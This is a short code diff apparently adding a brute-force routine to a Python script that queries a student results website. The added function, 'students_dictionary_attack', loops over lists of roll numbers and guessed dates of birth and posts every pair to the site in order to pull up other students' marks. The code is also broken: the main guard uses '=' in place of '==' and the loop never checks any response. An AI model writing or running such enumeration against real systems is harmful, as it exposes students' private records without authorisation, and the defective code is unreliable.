@@ -26,3 +26,22 @@ def connection_send_package(roll_no, date_of_brith):
     payload = {'regno':roll_no, 'dob': date_of_brith, 'B1':'Get Marks'}
     responce = post(url, headers=header, data=payload)
     return responce
+
+def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_brith):
+    
+    total_number_of_Id = 0
+    total_count_of_squence_over_student  = 0 
+    number_of_dates = 0
+    
+    for studentID in collaction_of_roll_no:
+        total_number_of_Id += 1
+        number_of_dates = len( collaction_of_date_of_brith)
+        
+        for date_of_brith in collaction_of_date_of_brith:
+            number_of_dates -= 1
+            total_count_of_squence_over_student += 1
+            
+            package = connection_send_package( studentID, date_of_brith)
+
+if __name__ = '__main__':
+    pass
